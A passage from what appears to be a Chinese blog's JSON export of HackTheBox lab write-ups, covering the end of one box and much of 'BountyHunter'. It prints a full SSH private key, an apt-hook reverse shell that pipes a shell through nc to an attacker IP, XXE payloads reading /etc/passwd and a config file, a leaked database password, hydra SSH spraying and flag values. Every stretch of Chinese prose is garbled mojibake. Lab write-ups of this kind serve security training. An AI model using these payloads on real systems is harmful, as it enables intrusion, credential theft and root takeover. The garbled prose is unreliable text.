KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n```\nç»™äºˆæƒé™\n\n```Plain Text\nchmod 600 id_rsa\n```\nç„¶åä½¿ç”¨sshè¿›è¡Œç™»å½•johnç”¨æˆ·\n\n```Plain Text\nssh john@10.10.11.101 -i id_rsa\n```\nç™»å…¥åææƒ > å‚è€ƒè¿æ¥\n\n> https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/\n\n```Plain Text\ncd /etc/apt/apt.conf.d\n\necho 'apt::Update::Pre-Invoke {\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.110 4444 >/tmp/f\"};' > exp\n```\nç„¶åæœ¬åœ°ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```Plain Text\nnc -nvlp 4444\n```\nç„¶åç­‰ç€rootæ‰§è¡Œè¯¥è„šæœ¬å³å¯ï¼Œå¯èƒ½éœ€è¦ç­‰å‡ åˆ†é’Ÿ\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nc -nvlp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.14.110] from (UNKNOWN) [10.10.11.101] 41008\n/bin/sh: 0: can't access tty; job control turned off\n# whoami && id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸææƒåˆ°root\n\n```Plain Text\n# cat root.txt\n3664a02fe4477fdc202e27ec4e29de82\n```\næˆåŠŸæ‹¿åˆ°rootæƒé™çš„flag","tags":["Hackthebox"]},{"title":"BountyHunter - Hackthebox","url":"/2021/07/25/Hackthebox/Easy/Hackthebox-BountyHunter/","content":"\n# Hackthebox - BountyHunter\n## é¶åœºä¿¡æ¯\n![](Hackthebox-BountyHunter/498c133a-fe2b-4ecc-857f-88db9ac41a1d.png)\n\n## é¶åœºç±»å‹\n![](Hackthebox-BountyHunter/89afe67a-26ef-4502-8682-01d900757f3c.png)\n\n## ä¿¡æ¯æœé›†\nä½¿ç”¨nmapè¿›è¡Œç«¯å£æ‰«æ\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# nmap -A -sS -sC -sV -p- 10.10.11.100\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-07-25 13:02 CST\nNmap scan report for 10.10.11.100\nHost is up (0.25s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)\n|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)\n|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Bounty Hunters\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=7/25%OT=22%CT=1%CU=31546%PV=Y%DS=2%DC=T%G=Y%TM=60FCF27\nOS:8%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1\nOS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN\nOS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 80/tcp)\nHOP RTT       ADDRESS\n1   251.53 ms 10.10.14.1\n2   251.65 ms 10.10.11.100\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 546.93 seconds\n```\nä»æ‰«æç»“æœä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹å‡ ä¸ªä¿¡æ¯ï¼š - æœ¬å°é¶æœºå¼€å¯äº†`22`ã€`80`ç«¯å£ - æœ¬å°80ç«¯å£ä½¿ç”¨äº†Apache/2.4.41ä½œä¸ºHTTPæœåŠ¡\n\nå’±ä»¬å»è®¿é—®80ç«¯å£çœ‹çœ‹å†…å®¹ã€‚\n\n![](Hackthebox-BountyHunter/78dd4165-7463-4056-b3e9-23293d145873.png)\n\nè¿™å¥½åƒæ˜¯ä¸€ä¸ªSRCå¹³å°ï¼Ÿä¸“ä¸šå¯¹å£\n\nå‘ç°äº†ä¸€ä¸ªphpæ–‡ä»¶\n\n```Plain Text\nhttp://10.10.11.100/log_submit.php\n```\nç®€å•æµ‹è¯•äº†ä¸€ä¸‹XSSï¼Œä½†æ˜¯æ²¡æœ‰æˆåŠŸï¼Œå…ˆæ”¾ç€ä¸ç®¡æˆ‘ä»¬æ‰¾æ‰¾å…¶ä»–æ€è·¯\n\nå…ˆåšä¸€ä¸ªFUZZçœ‹çœ‹å§\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# gobuster dir -u http://10.10.11.100 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.11.100\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              php,html,txt\n[+] Timeout:                 10s\n===============================================================\n2021/07/25 13:24:30 Starting gobuster in directory enumeration mode\n===============================================================\n/.htpasswd            (Status: 403) [Size: 277]\n/.hta.txt             (Status: 403) [Size: 277]\n/.htaccess            (Status: 403) [Size: 277]\n/.htaccess.php        (Status: 403) [Size: 277]\n/.htpasswd.php        (Status: 403) [Size: 277]\n/.hta                 (Status: 403) [Size: 277]\n/.hta.php             (Status: 403) [Size: 277]\n/.htaccess.html       (Status: 403) [Size: 277]\n/.htpasswd.html       (Status: 403) [Size: 277]\n/.hta.html            (Status: 403) [Size: 277]\n/.htaccess.txt        (Status: 403) [Size: 277]\n/.htpasswd.txt        (Status: 403) [Size: 277]\n/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]\n/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]\n/db.php               (Status: 200) [Size: 0]\n/index.php            (Status: 200) [Size: 25169]\n/index.php            (Status: 200) [Size: 25169]\n/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]\n/portal.php           (Status: 200) [Size: 125]\n/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]\n/server-status        (Status: 403) [Size: 277]\n\n===============================================================\n2021/07/25 13:32:25 Finished\n===============================================================\n```\nå’±ä»¬çœ‹çœ‹`/resources`ç›®å½•\n\n```Plain Text\nIndex of /resources\n[ICO]   Name    Last modified   Size    Description\n[PARENTDIR] Parent Directory        -\n[TXT]   README.txt  2021-04-06 00:01    210\n[   ]   all.js  2021-04-05 17:37    1.1M\n[   ]   bootstrap.bundle.min.js 2021-04-05 17:41    82K\n[   ]   bootstrap_login.min.js  2021-04-05 17:08    48K\n[   ]   bountylog.js    2021-06-15 15:47    594\n[   ]   jquery.easing.min.js    2020-05-04 09:11    2.5K\n[   ]   jquery.min.js   2020-05-04 16:01    87K\n[   ]   jquery_login.min.js 2021-04-05 17:09    85K\n[TXT]   lato.css    2021-04-05 17:39    2.6K\n[TXT]   monsterat.css   2021-04-05 17:39    3.2K\nApache/2.4.41 (Ubuntu) Server at 10.10.11.100 Port 80\n```\nå’±ä»¬æŒ¨ä¸ªæŸ¥çœ‹ä¸€ä¸‹\n\nåœ¨`README.txt`ä¸­å‘ç°äº†ä¸€ä¸ªæç¤º\n\n```Plain Text\nTasks:\n\n[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.\n[X] Write tracker submit script\n[ ] Connect tracker submit script to the database\n[X] Fix developer group permissions\n```\nå’±ä»¬æŠŠç›®å…‰æ”¾åœ¨`/bountylog.js`è¿™ä¸ªæ–‡ä»¶ä¸Š\n\n```Plain Text\nfunction returnSecret(data) {\n    return Promise.resolve($.ajax({\n            type: \"POST\",\n            data: {\"data\":data},\n            url: \"tracker_diRbPr00f314.php\"\n            }));\n}\n\nasync function bountySubmit() {\n    try {\n        var xml = `<?xml  version=\"1.0\" encoding=\"ISO-8859-1\"?>\n        <bugreport>\n        <title>${$('#exploitTitle').val()}</title>\n        <cwe>${$('#cwe').val()}</cwe>\n        <cvss>${$('#cvss').val()}</cvss>\n        <reward>${$('#reward').val()}</reward>\n        </bugreport>`\n        let data = await returnSecret(btoa(xml));\n        $(\"#return\").html(data)\n    }\n    catch(error) {\n        console.log('Error:', error);\n    }\n}\n```\n## æ¼æ´åˆ©ç”¨\nçœ‹åˆ°è¿™é‡Œå’±ä»¬æ¢³ç†ä¸€ä¸‹æ€è·¯å“ˆ\n\n1. `http://10.10.11.100/log_submit.php`ä¸­æç¤ºæ˜¯ä¸€ä¸ªæäº¤çª—å£\n2. `http://10.10.11.100/resources/README.txt`ä¸­æç¤ºæˆ‘ä»¬è¦å†™ä¸€ä¸ªæäº¤è„šæœ¬åˆ°æ•°æ®åº“ï¼Œä½†æˆ‘ä»¬ç›®å‰å¹¶ä¸çŸ¥é“è¦å†™ä»€ä¹ˆè„šæœ¬\n3. `http://10.10.11.100/resources/bountylog.js`ä¸­æç¤ºæˆ‘ä»¬è¦ç¼–å†™ä¸€ä¸ªXMLè„šæœ¬æäº¤åˆ°`tracker_diRbPr00f314.php`ï¼Œå¹¶ä¸”ç»™å‡ºäº†æˆ‘ä»¬è„šæœ¬æ ¼å¼\n4. æˆ‘ä»¬è®¿é—®`tracker_diRbPr00f314.php`åå¯ä»¥çœ‹åˆ°ï¼Œå†…å®¹å°±æ˜¯`http://10.10.11.100/log_submit.php`æäº¤åè¿”å›çš„å†…å®¹\n\nå¹³æ—¶æˆ‘æ˜¯ä¸ä¼šå†™è¿™ä¹ˆè¯¦ç»†çš„ï¼Œè¿™é‡Œå•çº¯æ˜¯æ€¼æŸä¸ªè¯´æˆ‘æŠ„åˆ«äººå†…å®¹çš„æ ç²¾ï¼Œç»™ä½ çœ‹çœ‹æˆ‘çš„è§£é¢˜æ€è·¯ï¼Œçœ‹çœ‹åˆ°åº•æ˜¯æŠ„çš„åˆ«äººçš„è¿˜æ˜¯æˆ‘è‡ªå·±æƒ³çš„ï¼Œå®ååˆ¶DISSä½ ï¼Œä¸æœéšæ—¶æ¥æ \n\nç„¶åå’±ä»¬æ•´ç†ä¸€ä¸‹æ‰‹ä¸Šæœ‰çš„ä¿¡æ¯ 1. å’±ä»¬æ‰‹é‡Œæœ‰ä¸€ä¸ªæäº¤çª—å£`/log_submit.php` 2. å’±ä»¬æœ‰ä¸€ä¸ªä¸€çœ‹å°±å¾ˆé‡è¦ä½†æ²¡æœ‰å†…å®¹çš„æ–‡ä»¶`/db.php` 3. æœ‰ä¸€ä¸ªXMLæ³¨å…¥çš„ç¤ºä¾‹è„šæœ¬\n\nOKï¼Œç›®æ ‡å¾ˆæ˜ç¡®äº†ï¼Œå’±ä»¬ä½¿ç”¨XMLæ³¨å…¥å»è¯»å–`/db.php`æ–‡ä»¶çš„å†…å®¹å³å¯\n\né’ˆå¯¹è¯¥ç›®æ ‡ç¼–å†™è„šæœ¬\n\n```Plain Text\nvar xml = `<?xml  version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/var/www/html/db.php\"> ]>\n        <bugreport>\n        <title>&xxe;</title>\n        <cwe>something</cwe>\n        <cvss>something</cvss>\n        <reward>something</reward>\n        </bugreport>`\n```\næäº¤åˆ°æ§åˆ¶å°ï¼Œç„¶åä½¿ç”¨\n\n```Plain Text\nreturnSecret(btoa(xml));\n```\næ¥è¿›è¡Œè¯»å–\n\n![](Hackthebox-BountyHunter/63afcad2-5b03-47f3-a226-e3a036efece1.png)\n\næˆåŠŸè¯»å–åˆ°è¯¥æ–‡ä»¶ï¼Œå’±ä»¬çœ‹çœ‹å†…å®¹æ˜¯ä»€ä¹ˆ\n\n```Plain Text\nIf DB were ready, would have added:\n<table>\n  <tr>\n    <td>Title:</td>\n    <td>PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=</td>\n  </tr>\n  <tr>\n    <td>CWE:</td>\n    <td>something</td>\n  </tr>\n  <tr>\n    <td>Score:</td>\n    <td>something</td>\n  </tr>\n  <tr>\n    <td>Reward:</td>\n    <td>something</td>\n  </tr>\n</table>\n\n```\nçœ‹titleè¿”å›çš„å†…å®¹æ˜¯ä¸€æ®µbase64ç ï¼Œå’±ä»¬å»è§£å¯†è¯•è¯•\n\n```Plain Text\nPD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=\n\n<?php\n// TODO -> Implement login system with the database.\n$dbserver = \"localhost\";\n$dbname = \"bounty\";\n$dbusername = \"admin\";\n$dbpassword = \"m19RoAU0hP41A1sTsq6K\";\n$testuser = \"test\";\n?>\n```\nå’±ä»¬å¾—åˆ°äº†æ•°æ®åº“çš„è´¦å·å¯†ç ï¼Œå’±ä»¬è¯»å–`/etc/passwd`çœ‹çœ‹\n\n```Plain Text\nvar xml = `<?xml  version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> ]>\n        <bugreport>\n        <title>&xxe;</title>\n        <cwe>something</cwe>\n        <cvss>something</cvss>\n        <reward>something</reward>\n        </bugreport>`\n```\n```Plain Text\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nsshd:x:111:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\ndevelopment:x:1000:1000:Development:/home/development:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n```\nä¼¼ä¹å’Œæˆ‘æƒ³çš„ä¸ä¸€æ ·å•Šï¼Œè¿™é‡Œæˆ‘ä»¬è·å–åˆ°çš„æ•°æ®åº“ç”¨æˆ·åæ— æ³•ç”¨æ¥è¿›è¡Œsshç™»å½•ï¼Œè¿˜å¾—æ‰¾æ‰¾å…¶ä»–æ€è·¯\n\nå’±ä»¬ä½¿ç”¨hydraè¿›è¡Œçˆ†ç ´è¯•è¯•\n\né¦–å…ˆå°†`/etc/passwd`çš„æ–‡ä»¶ä¿å­˜åˆ°æœ¬åœ°\n\nç„¶åä½¿ç”¨cutå‘½ä»¤æ¥æå–ç”¨æˆ·å\n\n```Plain Text\ncut -d : -f 1 passwd > user\n```\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# cat user\nroot\ndaemon\nbin\nsys\nsync\ngames\nman\nlp\nmail\nnews\nuucp\nproxy\nwww-data\nbackup\nlist\nirc\ngnats\nnobody\nsystemd-network\nsystemd-resolve\nsystemd-timesync\nmessagebus\nsyslog\n_apt\ntss\nuuidd\ntcpdump\nlandscape\npollinate\nsshd\nsystemd-coredump\ndevelopment\nlxd\nusbmux\n```\nç°åœ¨å°±æŠŠæ‰€æœ‰çš„ç”¨æˆ·åéƒ½æå–å‡ºæ¥äº†\n\nç„¶åä½¿ç”¨hydraè¿›è¡Œçˆ†ç ´\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# hydra -L user -p m19RoAU0hP41A1sTsq6K 10.10.11.100 ssh                                                                                                                                                  255 â¨¯\nHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-25 14:42:27\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 34 login tries (l:34/p:1), ~3 tries per task\n[DATA] attacking ssh://10.10.11.100:22/\n[22][ssh] host: 10.10.11.100   login: development   password: m19RoAU0hP41A1sTsq6K\n[22][ssh] host: 10.10.11.100   login: development   password: m19RoAU0hP41A1sTsq6K\n1 of 1 target successfully completed, 2 valid passwords found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-25 14:42:44\n```\nç„¶åç¡®å®šäº†è´¦å·å¯†ç \n\n```Plain Text\nusername = development\npassword = m19RoAU0hP41A1sTsq6K\n```\nå’±ä»¬ä½¿ç”¨sshè¿›è¡Œç™»å½•\n\n```Plain Text\nâ”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]\nâ””â”€# ssh development@10.10.11.100\ndevelopment@10.10.11.100's password:\nWelcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sun 25 Jul 2021 06:57:17 AM UTC\n\n  System load:           0.0\n  Usage of /:            24.3% of 6.83GB\n  Memory usage:          15%\n  Swap usage:            0%\n  Processes:             216\n  Users logged in:       1\n  IPv4 address for eth0: 10.10.11.100\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:7ae5\n\n0 updates can be applied immediately.\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sun Jul 25 04:44:41 2021 from 10.10.14.17\ndevelopment@bountyhunter:~$ whoami && id\ndevelopment\nuid=1000(development) gid=1000(development) groups=1000(development)\n```\næˆåŠŸgetshell\n\n```Plain Text\ndevelopment@bountyhunter:~$ cat user.txt\n12df9cbc3e04ef498fad5cdd101563b4\n```\næˆåŠŸæ‹¿åˆ°useræƒé™çš„flag ## æƒé™æå‡ å’±ä»¬ä½¿ç”¨sudo -læŸ¥çœ‹ä¸€ä¸‹æƒé™\n\n```Plain Text\ndevelopment@bountyhunter:~$ sudo -l\nMatching Defaults entries for development on bountyhunter:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser development may run the following commands on bountyhunter:\n    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py\n```\nå’±ä»¬å¯ä»¥åˆ©ç”¨`/usr/bin/python3.8`ä½¿ç”¨rootæƒé™æ— å¯†ç è¿è¡Œ`/opt/skytrain_inc/ticketValidator.py`æ–‡ä»¶\n\nå’±ä»¬æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶\n\n```Plain Text\ndevelopment@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py\n#Skytrain Inc Ticket Validation System 0.1\n#Do not distribute this file.\n\ndef load_file(loc):\n    if loc.endswith(\".md\"):\n        return open(loc, 'r')\n    else:\n        print(\"Wrong file type.\")\n        exit()\n\ndef evaluate(ticketFile):\n    #Evaluates a ticket to check for ireggularities.\n    code_line = None\n    for i,x in enumerate(ticketFile.readlines()):\n        if i == 0:\n            if not x.startswith(\"# Skytrain Inc\"):\n                return False\n            continue\n        if i == 1:\n            if not x.startswith(\"## Ticket to \"):\n                return False\n            print(f\"Destination: {' '.join(x.strip().split(' ')[3:])}\")\n            continue\n\n        if x.startswith(\"__Ticket Code:__\"):\n            code_line = i+1\n            continue\n\n        if code_line and i == code_line:\n            if not x.startswith(\"**\"):\n                return False\n            ticketCode = x.replace(\"**\", \"\").split(\"+\")[0]\n            if int(ticketCode) % 7 == 4:\n                validationNumber = eval(x.replace(\"**\", \"\"))\n                if validationNumber > 100:\n                    return True\n                else:\n                    return False\n    return False\n\ndef main():\n    fileName = input(\"Please enter the path to the ticket file.\\n\")\n    ticket = load_file(fileName)\n    #DEBUG print(ticket)\n    result = evaluate(ticket)\n    if (result):\n        print(\"Valid ticket.\")\n    else:\n        print(\"Invalid ticket.\")\n    ticket.close\n\nmain()\n```\né€šè¿‡è§£è¯»è¿™ä¸ªpythonè„šæœ¬ï¼Œæˆ‘ä»¬å¾—çŸ¥ï¼Œè¿™ä¸ªè„šæœ¬è¦æ±‚æˆ‘ä»¬è¾“å…¥æ–‡ä»¶åï¼Œä¸”æ–‡ä»¶åè¦ä»¥`.md`ä¸ºç»“å°¾ã€‚å¦‚æœæ¡ä»¶æ»¡è¶³ï¼Œåˆ™è„šæœ¬æ‰“å¼€æ–‡ä»¶å¹¶æœç´¢ä¸‹ä¸€ä¸ªæ¡ä»¶ã€‚\n\n```Plain Text\nfor i,x in enumerate(ticketFile.readlines()):\n\n        if i == 0: # if line number 0 not startwith \"# Skytrain Inc\", Quit, else Continue\n            if not x.startswith(\"# Skytrain Inc\"):\n                return False\n            continue\n        if i == 1: if line number 1 Exist and 